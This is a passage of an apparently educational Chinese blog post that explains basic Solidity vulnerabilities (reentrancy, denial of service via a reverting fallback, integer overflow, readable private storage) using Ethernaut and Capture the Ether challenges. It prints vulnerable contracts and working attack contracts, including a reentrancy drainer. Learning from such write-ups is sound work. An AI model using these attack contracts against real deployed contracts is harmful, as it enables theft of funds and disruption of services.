{"title":"Smart Contract Basic Vulnerability Summary","uid":"ffa4ad3cb02d93d241db5e33b2dfae61","slug":"Smart Contract Basic Vulnerability Summary","date":"2022-08-01T10:46:51.248Z","updated":"2023-01-06T12:52:13.363Z","comments":true,"path":"api/articles/Smart Contract Basic Vulnerability Summary.json","keywords":null,"cover":"https://cdn.jsdelivr.net/gh/bcYng-w/images1/img/202208011820525.png","content":"<h1 id=\"1-关于转账的漏洞\"><a href=\"#1-关于转账的漏洞\" class=\"headerlink\" title=\"1.关于转账的漏洞\"></a>1.关于转账的漏洞</h1><p>在solidity中有三种转账方式，分别是call，transfer和send，后两者相对安全，但也分别对应着漏洞。</p>\n<h2 id=\"call转账漏洞——重入\"><a href=\"#call转账漏洞——重入\" class=\"headerlink\" title=\"call转账漏洞——重入\"></a>call转账漏洞——重入</h2><p>例子：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Reentrance</span> <span class=\"token punctuation\">&#123;</span>\n  \n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balances<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">donate</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _who<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_who<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> _amount<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> result<span class=\"token punctuation\">,</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span>_amount<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        _amount<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n      balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _amount<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>原理：call转账会调用所有的gas，并且转账出现异常之后不会抛出异常而是返回false</p>\n<p>漏洞分析：经典的重入漏洞，使用了call转账，并且balances[msg.sender]在转账完成之后才进行更新，所以构造攻击合约中的fallback触发即可</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    test <span class=\"token keyword\">constant</span> <span class=\"token keyword\">private</span> target<span class=\"token operator\">=</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">cunqian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span>donate<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">tuiqian</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">check</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xEdBA908c98185b82b1aBb31AFAF66B2f415491B2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token operator\">>=</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">reuse</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>相应例题：</p>\n<p>ethernaut——re-entrancy <a href=\"https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D\">https://ethernaut.openzeppelin.com/level/0xe6BA07257a9321e755184FB2F995e0600E78c16D</a></p>\n<p>capture the ether——Token bank</p>\n<p><a href=\"https://capturetheether.com/challenges/miscellaneous/token-bank/\">https://capturetheether.com/challenges/miscellaneous/token-bank/</a></p>\n<h2 id=\"transfer转账漏洞——拒绝服务\"><a href=\"#transfer转账漏洞——拒绝服务\" class=\"headerlink\" title=\"transfer转账漏洞——拒绝服务\"></a>transfer转账漏洞——拒绝服务</h2><p>例子：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">King</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> prize<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> owner<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    owner <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>  \n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> prize <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> owner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    king<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    king <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">;</span>\n    prize <span class=\"token operator\">=</span> msg<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">_king</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> king<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>原理：transfer函数如果异常会转账失败，抛出异常。并且有gas限制，最大2300，避免了重入漏洞。</p>\n<p>漏洞分析：题目就是要求成为king，但是题目会进行king的重申，而transfer函数不同于call和send，call和send函数执行后会返回true或者false，transfer函数执行失败后会进行回滚(revert)所以我们将king变成自己后提交实例时要阻止关卡对于king的重申，简单来说就是让关卡触发receive函数时失败。直接使用revert让关卡在想攻击合约转账时失败以上两种方法可以使漏洞合约中的transfer函数执行失败从而进行回滚导致king的重申失败。</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token builtin\">address</span> target <span class=\"token operator\">=</span><span class=\"token number\">0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value <span class=\"token punctuation\">:</span> <span class=\"token number\">0.001</span> ether<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">revert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>相应例题：</p>\n<p>ethernaut——King</p>\n<p><a href=\"https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\">https://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5</a></p>\n<h1 id=\"2-整数溢出漏洞\"><a href=\"#2-整数溢出漏洞\" class=\"headerlink\" title=\"2.整数溢出漏洞\"></a>2.整数溢出漏洞</h1><h2 id=\"溢出漏洞\"><a href=\"#溢出漏洞\" class=\"headerlink\" title=\"溢出漏洞\"></a>溢出漏洞</h2><p>原理：</p>\n<p>在solidity中有两种整数的表达方式，分别是int和uint，代表有符号和无符号整数，整数溢出漏洞存在于uint中，比如uint(0-1)就相当于2^256-1，系那个一个小数字变成一个极大的数，分为上溢出和下溢处。通常使msg.value上溢出让交易金额变小，使余额下溢处获得更多余额。</p>\n<p>例一，msg.value上溢出：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.21</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">TokenSaleChallenge</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> balanceOf<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">constant</span> PRICE_PER_TOKEN <span class=\"token operator\">=</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">TokenSaleChallenge</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _player<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isComplete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance <span class=\"token operator\">&lt;</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buy</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> numTokens<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> numTokens <span class=\"token operator\">*</span> PRICE_PER_TOKEN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> numTokens<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sell</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> numTokens<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> numTokens<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        balanceOf<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> numTokens<span class=\"token punctuation\">;</span>\n        msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>numTokens <span class=\"token operator\">*</span> PRICE_PER_TOKEN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：</p>\n<p>buy函数中require msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN，其中PRICE_PER_TOKEN固定为1 ether，而numTokens。</p>\n<p>require直接进行乘法，没有检测计算值后得到的数值，在此处可以构造整数溢出漏洞从而使msg.value变成一个足够小的数值。</p>\n<p>例二，余额下溢处</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Token</span> <span class=\"token punctuation\">&#123;</span>\n\n  <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> balances<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> totalSupply<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> _initialSupply<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> totalSupply <span class=\"token operator\">=</span> _initialSupply<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _to<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> _value<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> _value <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> _value<span class=\"token punctuation\">;</span>\n    balances<span class=\"token punctuation\">[</span>_to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> _value<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _owner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> balance<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> balances<span class=\"token punctuation\">[</span>_owner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：一道非常简单的题目，看似逻辑比较严谨，但是注意 require(balances[msg.sender] - _value &gt;&#x3D; 0)一行，要知道，uint类型中0-1是大于且远远大于0的，此处存在溢出漏洞，并且value可控，直接计算value使余额下溢。</p>\n<p>相应例题：</p>\n<p>capture the ether——Token sale</p>\n<p><a href=\"https://capturetheether.com/challenges/math/token-sale/\">https://capturetheether.com/challenges/math/token-sale/</a></p>\n<p>ethernaut——Token</p>\n<p><a href=\"https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE\">https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE</a></p>\n<h1 id=\"3-随机数漏洞\"><a href=\"#3-随机数漏洞\" class=\"headerlink\" title=\"3.随机数漏洞\"></a>3.随机数漏洞</h1><p>原理：</p>\n<p>合约使用外界未知的私有变量参与随机数生成。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。</p>\n<p>或者使用，hash，coinbase、timestamp、number、difficulty、gaslimit等类型值作为随机数的，也存在安全问题，因为这些变量都是已知或者可操控的，比如在同意笔交易中，blockhash，blocnumber等均是相同的。值得注意的是blockhash只能读取最近的256个区块，在之前的将直接返回0。</p>\n<p>例一，变量经过存储之后可查询</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.18</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Vault</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> locked<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">private</span> password<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">Vault</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    locked <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    password <span class=\"token operator\">=</span> _password<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">unlock</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> _password<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>password <span class=\"token operator\">==</span> _password<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      locked <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>分析：password直接存储在slot1，而在区块链中，数据可以直接查询，利用如下代码即可获得password</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>web3<span class=\"token punctuation\">.</span>eth<span class=\"token punctuation\">.</span>getStorageAt<span class=\"token punctuation\">(</span>contractaddress<span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>相应例题：</p>\n<p>ethernaut——Vault：<a href=\"https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188\">https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188</a></p>\n<p>例二，使用区块链变量</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.4.21</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">GuessTheNewNumberChallenge</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">GuessTheNewNumberChallenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">==</span> <span class=\"token number\">1</span> ether<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">isComplete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token 